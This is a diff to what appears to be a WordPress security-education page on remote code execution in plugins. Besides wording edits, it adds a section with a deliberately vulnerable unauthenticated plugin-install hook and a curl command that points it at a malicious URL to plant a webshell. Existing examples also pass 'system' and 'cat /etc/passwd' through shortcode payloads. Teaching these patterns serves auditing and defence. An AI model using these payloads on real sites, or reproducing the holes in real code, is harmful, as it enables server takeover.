@@ -5,6 +5,7 @@ head:
       content: Learn about Remote Code Execution (RCE)
 contributors:
     - rafiem
+    - dhakalananda
 ---
 
 import { LinkCard } from '@astrojs/starlight/components';
@@ -12,7 +13,7 @@ import { LinkCard } from '@astrojs/starlight/components';
 
 ## Introduction
 
-This article covers cases of possible direct RCE on WordPress. This includes improper usage of functions inside of the plugin/theme which can be used to directly execute code or command on the server.
+This article covers cases of possible direct RCE on WordPress. This includes improper usage of functions inside the plugin/theme, which can be used to directly execute code or a command on the server.
 
 <LinkCard
   title="Learn how to secure your code against RCE"
@@ -35,7 +36,7 @@ Several functions could be useful to identify a possible RCE vulnerability:
 
 ## Dynamic Function Call
 
-PHP also supports a dynamic function call where we can execute a function from a string or variable. For example :
+PHP also supports a dynamic function call where we can execute a function from a string or variable. For example:
 
 ```php
 $action_type = $_GET["action"];
@@ -44,7 +45,7 @@ $input = $_GET["input"];
 echo $action_type($input);
 ```
 
-We can just simply supply the `action` parameter with arbitrary function such as `system` and put our shell command on the `input` parameter.
+We can supply the `action` parameter with an arbitrary function, such as `system`, and put our shell command on the `input` parameter.
 
 ## Example Cases
 
@@ -75,10 +76,35 @@ function image_render_callback($atts) {
 add_shortcode("imagerender", "image_render_callback");
 ```
 
-To exploit this, the Contributor+ role user simply needs to create a drafted post with the below content to trigger RCE via `call_user_func` function:
+To exploit this, the Contributor+ role user needs to create a drafted post with the below content to trigger RCE via the `call_user_func` function:
 
 ```json
 [imagerender src="https://patchstack.com" sanitize="system" text="cat /etc/passwd"]
+```
+
+## Arbitrary Plugin Installation
+
+If there is no proper permission check while installing the plugins, it can lead to Remote Code Execution. An attacker can create a malicious ZIP and provide it as the source to install the webshell in the WordPress site.
+
+```php
+add_action('wp_ajax_nopriv_install_remote_plugin', function() {
+    if (isset($_GET['install_plugin_url'])) {
+        $plugin_url = esc_url_raw($_GET['install_plugin_url']);
+
+        include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
+        include_once ABSPATH . 'wp-admin/includes/file.php';
+        include_once ABSPATH . 'wp-admin/includes/misc.php';
+
+        $upgrader = new Plugin_Upgrader();
+        $upgrader->install($plugin_url);
+    }
+});
+```
+
+To exploit this, any unauthenticated user needs to perform a GET request to the `/wp-admin/admin-ajax.php` endpoint specifying the remote URL of the malicious plugin.
+
+```bash
+curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=install_remote_plugin&install_plugin_url=http://<malicious-url>
 ```
 
 Below are some of the findings related to RCE:
